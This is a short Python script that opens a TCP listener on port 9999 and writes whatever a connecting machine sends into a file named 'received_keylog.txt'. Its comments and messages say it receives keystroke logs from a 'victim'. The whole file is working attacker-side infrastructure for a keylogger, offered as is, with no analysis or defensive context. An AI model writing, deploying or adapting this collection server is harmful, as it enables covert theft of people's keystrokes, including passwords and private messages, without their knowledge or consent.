import socket

def start_listener():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 9999  # Port used to receive data from victim
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print("Listening for incoming keylogs...")

    conn, addr = s.accept()
    print(f"Connection established with {addr}")
    with open("received_keylog.txt", 'w') as f:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            f.write(data.decode('utf-8'))

    conn.close()

start_listener()
